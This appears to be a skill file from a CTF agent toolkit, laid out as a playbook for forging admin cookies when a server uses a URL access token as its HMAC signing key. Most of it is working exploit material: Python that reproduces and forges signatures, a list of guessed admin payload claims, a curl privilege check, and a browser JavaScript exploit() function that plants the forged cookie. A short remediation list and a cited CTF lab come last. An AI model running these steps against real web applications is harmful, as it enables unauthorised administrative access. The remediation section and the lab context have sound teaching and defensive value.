# Cookie HMAC key reuse → admin authentication bypass

> When the server reuses the publicly visible access token from the URL as the cookie signing key, and the admin side trusts the claim fields in the cookie payload directly, an administrator identity can be forged.

---

## When this applies

- The target is a web application whose URL path carries parameters such as `access_token`, `token` or `key`
- The response headers set a signed cookie (e.g. `student_gate=<payload>.<signature>`)
- There may be several signed cookies (student side and admin side) sharing a single key
- The admin cookie payload contains a client-controllable privilege claim (e.g. `{"admin":true}`)

## Keywords

- HMAC key reuse
- Known-key session forgery
- Client-side claims-based authorization
- Cookie signature bypass

## Attack workflow

### Step 1: extract the access token from the URL

The entry URL usually shows it plainly:

```
/access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

Extract the token:

```
blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

### Step 2: observe the student_gate cookie

Visit the entry point and the response headers set a signed cookie, usually in this form:

```
Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
```

Decode the payload to confirm its structure.

### Step 3: verify the signing algorithm

Using the known access token as the HMAC key, try to reproduce the signature:

```python
import hmac, hashlib, base64

access_token = "the token extracted from the URL"
payload_b64 = "the payload part extracted from the cookie"
expected_sig = "the signature part extracted from the cookie"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

computed = b64url(hmac.new(
    access_token.encode(),
    payload_b64.encode(),
    hashlib.sha256
).digest())

print("match" if computed == expected_sig else "no match")
```

If it matches, the access token is confirmed to be the HMAC key.

### Step 4: guess the admin cookie name and payload structure

Common admin cookie names:

- `admin_session`
- `admin_token`
- `admin_auth`
- `manage_token`
- `backstage_session`

Payload structures worth probing (try them one by one until you get a 200):

```json
{"admin":true}
{"role":"admin"}
{"isAdmin":true}
{"access":"admin"}
{"level":"admin"}
{"user":"admin"}
{"authenticated":true}
{"type":"admin"}
```

### Step 5: forge the admin cookie

```python
import hmac, hashlib, json, base64

access_token = "the known token"
payload = {"admin": True}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(
    access_token.encode(), payload_b64.encode(), hashlib.sha256
).digest())

cookie = f"admin_session={payload_b64}.{sig}"
print(cookie)
```

### Step 6: verify admin privileges

```bash
curl -k -H "Cookie: <the cookie produced in the previous step>" https://target/api/admin/me
```

Getting back `{"admin":true}`, or a 200 with administrator data, means it worked.

## Reproducing in a browser

```javascript
async function exploit() {
  const token = location.pathname.split('/access/')[1];
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', enc.encode(token),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const payload = btoa('{"admin":true}').replace(/=/g, '');
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  document.cookie = `admin_session=${payload}.${sigB64}; path=/; Secure`;
  location.reload();
}
exploit();
```

## Remediation

1. Sign cookies with a dedicated server-side key, never one shared with the URL token
2. Base admin privileges on server-side session state, not on claims in the client's cookie payload
3. Use different signing keys for different roles
4. Add and validate claims such as `iat`, `exp` and `typ` in the cookie
5. Handle signature parsing errors quietly (return 401 on failure, not 500)

## Related case

- Admin bypass on the class.pangbaoba.me CTF lab (student_gate and admin_session shared the access token as the HMAC key, and `{"admin":true}` granted administrator privileges outright)

## Related skills

- `CTF-Sandbox-Orchestrator/competition-web-runtime/SKILL.md` — web runtime analysis
- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/SKILL.md` — similar token claim confusion
- `reverse-engineering/languages-platforms.md` — JWT and OAuth material
